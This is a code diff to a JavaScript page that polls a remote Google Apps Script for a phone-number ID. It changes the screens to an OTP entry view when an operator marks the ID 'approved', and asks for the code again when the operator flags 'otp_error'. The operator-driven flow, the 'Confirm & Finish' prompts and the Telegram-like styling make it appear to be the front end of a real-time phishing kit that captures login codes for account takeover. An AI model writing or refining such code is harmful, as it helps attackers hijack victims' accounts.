@@ -177,51 +177,58 @@ async function startVerification() {
     startPolling(rawId);
 }
     async function startPolling(phone) {
-    // 1. Clean the ID exactly like the Operator link does
     const cleanID = String(phone).trim();
-    console.log("Started polling for ID: " + cleanID);
     
     const poller = setInterval(async () => {
         try {
-            // 2. IMPORTANT: Change 'num=' to 'id=' to match your new script
-            // 3. Add v=Date.now() to force Google to give us the LATEST status
+            // Using 'id=' to match your current script and 'v=' to bypass cache
             const r = await fetch(`${SCRIPT_URL}?id=${encodeURIComponent(cleanID)}&v=${Date.now()}`);
             const status = (await r.text()).trim();
 
             console.log("Current Status: " + status);
 
+            // --- THE WRONG OTP TRIGGER ---
             if (status === "otp_error" && !isResetting) {
                 isResetting = true;
-                // Clear the error so it doesn't loop
-                await fetch(`${SCRIPT_URL}?id=${encodeURIComponent(cleanID)}&cmd=clear`);
-                
-                const timerEl = document.getElementById('timer');
-                timerEl.style.color = "yellow";
-                timerEl.innerText = "❌ INVALID CODE - TRY AGAIN";
-                
-                document.querySelectorAll('.otp-input').forEach(input => {
-                    input.value = "";
-                    input.disabled = false;
-                });
-                document.getElementById('otp-btn').innerText = "Confirm & Finish";
-                document.getElementById('otp-btn').disabled = false;
 
+                // 1. Tell Google to clear the error so we don't loop forever
+                await fetch(`${SCRIPT_URL}?id=${encodeURIComponent(cleanID)}&cmd=clear`);
+
+                // 2. UI Feedback: Change the timer text to an Error Message
+                const timerEl = document.getElementById('timer');
+                timerEl.style.color = "#ffdd00"; // Yellow warning
+                timerEl.innerText = "❌ INVALID CODE - TRY AGAIN";
+
+                // 3. UNLOCK THE INPUTS
+                document.querySelectorAll('.otp-input').forEach(input => {
+                    input.value = "";       // Clear the old numbers
+                    input.disabled = false; // Let them type again
+                });
+                
+                // 4. Reset the Button
+                const btn = document.getElementById('otp-btn');
+                btn.innerText = "Confirm & Finish";
+                btn.disabled = false;
+
+                // 5. Restart the 30s countdown
                 runCountdown(30);
-                setTimeout(() => { isResetting = false; }, 2000);
+
+                // 6. Reset the warning color after 3 seconds
+                setTimeout(() => { 
+                    timerEl.style.color = "var(--tele-red)";
+                    isResetting = false; 
+                }, 3000);
             }
 
+            // --- THE APPROVAL TRIGGER ---
             if (status === "approved") {
-                console.log("✅ Match found! Moving to OTP view.");
                 clearInterval(poller);
-                showView(3); // Move to OTP screen
+                showView(3); // Move to OTP Screen
                 runCountdown(30);
-                // Clean up the status
                 fetch(`${SCRIPT_URL}?id=${encodeURIComponent(cleanID)}&cmd=clear`);
             }
-        } catch (e) { 
-            console.error("Polling failed:", e); 
-        }
-    }, 3000); // Check every 3 seconds
+        } catch (e) { console.error("Poll error", e); }
+    }, 3000);
 }
 
 
